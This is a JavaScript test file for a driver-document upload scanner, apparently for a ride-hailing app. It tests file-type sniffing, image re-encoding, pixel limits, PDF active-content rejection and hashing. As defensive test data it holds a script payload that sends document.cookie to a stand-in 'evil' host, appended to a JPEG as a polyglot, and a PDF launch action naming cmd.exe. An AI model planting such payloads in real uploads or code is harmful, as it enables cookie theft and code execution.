import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import sharp from 'sharp'
import PDFDocument from 'pdfkit'

import {
  magicContentType,
  reencodeImage,
  scanPdf,
  sha256,
  MAX_IMAGE_PIXELS,
} from '../services/documentScan.js'
import {
  maxBytesFor,
  MAX_IMAGE_BYTES,
  MAX_PDF_BYTES,
  isDriverDocumentType,
  DRIVER_DOCUMENT_TYPES,
  REQUIRED_DRIVER_DOCUMENTS,
  EXPIRING_DRIVER_DOCUMENTS,
  NUMBERED_DRIVER_DOCUMENTS,
  PROFILE_PHOTO_TYPE,
} from '../constants/driverDocuments.js'

// The file checks, exercised against real files rather than mocks.
//
// Every one of these is a claim the design rests on — "re-encoding destroys an
// appended payload", "a 60 MP header is refused before it is decoded" — and a
// claim about sharp's behaviour is only worth as much as the last time somebody
// ran it. sharp is a native library that gets upgraded; these are what notice.
//
// No database and no network. Everything here is bytes in, verdict out.

const jpeg = (opts = {}) =>
  sharp({ create: { width: 1200, height: 800, channels: 3, background: '#c8c8c8', ...opts } })
    .jpeg({ quality: 90 }).toBuffer()

const png = (width = 64, height = 64) =>
  sharp({ create: { width, height, channels: 3, background: '#ffffff' } }).png().toBuffer()

const pdf = (write) => new Promise((resolve) => {
  const doc = new PDFDocument()
  const chunks = []
  doc.on('data', (c) => chunks.push(c))
  doc.on('end', () => resolve(Buffer.concat(chunks)))
  write(doc)
  doc.end()
})

describe('magic bytes', () => {
  test('recognises each accepted format', async () => {
    assert.equal(magicContentType(await jpeg()), 'image/jpeg')
    assert.equal(magicContentType(await png()), 'image/png')
    assert.equal(magicContentType(await pdf((d) => d.text('policy'))), 'application/pdf')
  })

  // The case the whole sniff exists for: Storage stores the Content-Type the
  // uploader sent and never looks at the bytes, so "declared image/jpeg" and
  // "is a JPEG" are completely independent facts.
  test('HTML pretending to be an image is not an image', () => {
    const html = Buffer.from('<!DOCTYPE html><script>alert(1)</script>')
    assert.equal(magicContentType(html), null)
  })

  test('a PDF pretending to be a JPEG still reads as a PDF', async () => {
    // The caller compares this against the declared type, so returning the TRUE
    // type — not null — is what makes the mismatch detectable.
    const bytes = await pdf((d) => d.text('policy'))
    assert.equal(magicContentType(bytes), 'application/pdf')
    assert.notEqual(magicContentType(bytes), 'image/jpeg')
  })

  test('a PNG pretending to be a JPEG still reads as a PNG', async () => {
    assert.equal(magicContentType(await png()), 'image/png')
  })

  test('an executable is refused outright', () => {
    // MZ — a Windows PE header, the thing most likely to be renamed .pdf.
    assert.equal(magicContentType(Buffer.from([0x4d, 0x5a, 0x90, 0x00])), null)
  })

  // A polyglot's whole trick is that a second format's header sits at an offset
  // one parser will find and another will not. Offset 0 or nothing.
  test('a signature at a non-zero offset does not count', async () => {
    const smuggled = Buffer.concat([Buffer.from('GIF89a'), await jpeg()])
    assert.equal(magicContentType(smuggled), null)
  })

  test('an empty or truncated file is refused', () => {
    assert.equal(magicContentType(new Uint8Array(0)), null)
    assert.equal(magicContentType(Buffer.from([0xff, 0xd8])), null) // JPEG needs three
  })
})

describe('image normalisation', () => {
  // The load-bearing claim. If this ever stops being true, the image half of the
  // security story is gone and nothing else in the system would notice.
  test('an appended payload does not survive re-encoding', async () => {
    const payload = Buffer.from('<script>fetch("https://evil/"+document.cookie)</script>')
    const polyglot = Buffer.concat([await jpeg(), payload])

    assert.ok(polyglot.includes(payload), 'the payload survives a raw upload')
    assert.equal(magicContentType(polyglot), 'image/jpeg', 'and it still sniffs as a JPEG')

    const clean = await reencodeImage(polyglot)
    assert.ok(!clean.includes(payload), 'but not a re-encode')
  })

  test('EXIF metadata does not survive re-encoding', async () => {
    const marker = Buffer.from('PAYLOAD-MARKER')
    const withExif = await sharp(await jpeg())
      .withMetadata({ exif: { IFD0: { Copyright: 'PAYLOAD-MARKER' } } })
      .toBuffer()

    assert.ok(withExif.includes(marker))
    assert.ok(!(await reencodeImage(withExif)).includes(marker))
  })

  test('a PNG is normalised to JPEG', async () => {
    const out = await reencodeImage(await png(400, 300))
    assert.equal(magicContentType(out), 'image/jpeg')
  })

  // The decompression-bomb guard. Read off the header, so the allocation the
  // bomb is asking for is never made.
  test('an image over the pixel limit is refused before it is decoded', async () => {
    const side = Math.ceil(Math.sqrt(MAX_IMAGE_PIXELS)) + 2000
    const huge = await sharp({ create: { width: side, height: side, channels: 3, background: '#fff' } })
      .png().toBuffer()

    await assert.rejects(
      () => reencodeImage(huge),
      (err) => /pixel limit/i.test(err.message),
    )
  })

  test('an image just under the pixel limit is accepted', async () => {
    // 4000x4000 = 16 MP, comfortably inside 50 MP and larger than any phone camera.
    const big = await sharp({ create: { width: 4000, height: 4000, channels: 3, background: '#eee' } })
      .jpeg().toBuffer()
    assert.equal(magicContentType(await reencodeImage(big)), 'image/jpeg')
  })

  test('something that is not an image at all is refused', async () => {
    await assert.rejects(() => reencodeImage(Buffer.from('<!DOCTYPE html><h1>hi</h1>')))
  })

  test('a truncated JPEG is refused', async () => {
    const whole = await jpeg()
    await assert.rejects(() => reencodeImage(whole.subarray(0, Math.floor(whole.length / 3))))
  })
})

describe('PDF active content', () => {
  test('an ordinary scan trips nothing', async () => {
    const bytes = await pdf((d) => d.fontSize(11).text('POLICY No. 3419-XX-88123  VALID TO 31/03/2027'))
    const { found, flagged } = scanPdf(bytes)
    assert.deepEqual(found, [])
    assert.deepEqual(flagged, [])
  })

  test('embedded JavaScript is rejected', () => {
    const bytes = Buffer.from('%PDF-1.4\n<< /Type /Action /S /JavaScript /JS (app.alert(1)) >>')
    assert.deepEqual(scanPdf(bytes).found, ['/JavaScript'])
  })

  test('a launch action and an embedded file are rejected', () => {
    const bytes = Buffer.from('%PDF-1.4\n/Launch /F (cmd.exe)\n/EmbeddedFile\n/RichMedia')
    assert.deepEqual(scanPdf(bytes).found, ['/Launch', '/EmbeddedFile', '/RichMedia'])
  })

  test('OpenAction and XFA are flagged but allowed', () => {
    const bytes = Buffer.from('%PDF-1.4\n/OpenAction [3 0 R /Fit]\n/XFA 12 0 R')
    const { found, flagged } = scanPdf(bytes)
    assert.deepEqual(found, [], 'not grounds for rejection on their own')
    assert.deepEqual(flagged, ['/OpenAction', '/XFA'])
  })

  // The reason /JS and /AA are not on the reject list. This is the measurement
  // that decision was made from, kept as a test so it cannot quietly stop being
  // true if somebody is tempted to add them back.
  test('short tokens would false-positive on compressed streams', () => {
    const noise = Buffer.alloc(4 * 1024 * 1024)
    for (let i = 0; i < noise.length; i += 4) {
      noise.writeUInt32LE((Math.random() * 4294967296) >>> 0, i)
    }
    const text = noise.toString('latin1')

    const hits = (token) => {
      let n = 0, i = 0
      while ((i = text.indexOf(token, i)) !== -1) { n++; i++ }
      return n
    }

    // Every token actually on the reject list is long enough not to appear by
    // chance. That is the property being asserted; the short ones are excluded
    // precisely because they do not have it.
    for (const token of ['/JavaScript', '/Launch', '/EmbeddedFile', '/RichMedia']) {
      assert.equal(hits(token), 0, `${token} should not appear in random bytes`)
    }
    assert.ok(scanPdf(noise).found.length === 0, 'random bytes are not a malicious PDF')
  })
})

describe('file hashing', () => {
  test('is stable and distinguishes content', async () => {
    const a = await jpeg()
    assert.equal(sha256(a), sha256(Buffer.from(a)), 'same bytes, same hash')
    assert.equal(sha256(a).length, 64)
    assert.notEqual(sha256(a), sha256(await png()))
  })

  // What makes it useful for spotting a captain who sent the same photograph for
  // the front and the back of his car: the hash is of the STORED bytes, so two
  // identical uploads normalise to identical output.
  test('two identical images normalise to the same hash', async () => {
    const source = await jpeg()
    const one = await reencodeImage(Buffer.from(source))
    const two = await reencodeImage(Buffer.from(source))
    assert.equal(sha256(one), sha256(two))
  })

  test('a stripped payload changes the hash', async () => {
    const source = await jpeg()
    const polyglot = Buffer.concat([source, Buffer.from('PAYLOAD')])
    assert.notEqual(sha256(polyglot), sha256(await reencodeImage(polyglot)))
  })
})

describe('size limits', () => {
  test('are per content type, and the PDF one is looser', () => {
    assert.equal(maxBytesFor('image/jpeg'), MAX_IMAGE_BYTES)
    assert.equal(maxBytesFor('image/png'), MAX_IMAGE_BYTES)
    assert.equal(maxBytesFor('application/pdf'), MAX_PDF_BYTES)
    assert.ok(MAX_PDF_BYTES > MAX_IMAGE_BYTES)
  })

  // An unknown type must not accidentally get the loosest limit. Nothing should
  // reach here with one, but the fallback is the strict one either way.
  test('an unknown type falls back to the image limit', () => {
    assert.equal(maxBytesFor('application/x-msdownload'), MAX_IMAGE_BYTES)
    assert.equal(maxBytesFor(''), MAX_IMAGE_BYTES)
  })
})

describe('document type constants', () => {
  test('isDriverDocumentType accepts only the known keys', () => {
    for (const type of DRIVER_DOCUMENT_TYPES) assert.ok(isDriverDocumentType(type))
    assert.equal(isDriverDocumentType('police_verification'), false)
    assert.equal(isDriverDocumentType('__proto__'), false, 'hasOwn, not `in`')
    assert.equal(isDriverDocumentType('toString'), false)
  })

  test('the photographs are the only types with no number and no expiry', () => {
    // Three of them now: both faces of the car, and the captain himself.
    const photos = ['profile_photo', 'car_photo_front', 'car_photo_back']
    for (const type of photos) {
      assert.ok(!EXPIRING_DRIVER_DOCUMENTS.includes(type))
      assert.ok(!NUMBERED_DRIVER_DOCUMENTS.includes(type))
    }
    for (const type of DRIVER_DOCUMENT_TYPES.filter((t) => !photos.includes(t))) {
      assert.ok(EXPIRING_DRIVER_DOCUMENTS.includes(type), `${type} should expire`)
      assert.ok(NUMBERED_DRIVER_DOCUMENTS.includes(type), `${type} should carry a number`)
    }
  })

  // Police verification was on an earlier draft and the provider removed it.
  // Asserted so it cannot drift back in unnoticed.
  test('police verification is absent', () => {
    assert.ok(!DRIVER_DOCUMENT_TYPES.includes('police_verification'))
  })

  test('the optional types cannot hold up an approval', () => {
    assert.ok(!REQUIRED_DRIVER_DOCUMENTS.includes('permit_one_year'))
    assert.ok(!REQUIRED_DRIVER_DOCUMENTS.includes('cng_test'))
  })

  // The captain's photo is the file a RIDER is shown, so it is required and it
  // is first in the checklist — a passenger who cannot tell whether the man who
  // pulled up is the man the app sent is the problem it exists for.
  test('the profile photo is required and comes first', () => {
    assert.equal(DRIVER_DOCUMENT_TYPES[0], PROFILE_PHOTO_TYPE)
    assert.ok(REQUIRED_DRIVER_DOCUMENTS.includes(PROFILE_PHOTO_TYPE))
    assert.ok(!EXPIRING_DRIVER_DOCUMENTS.includes(PROFILE_PHOTO_TYPE), 'a face does not lapse')
  })
})
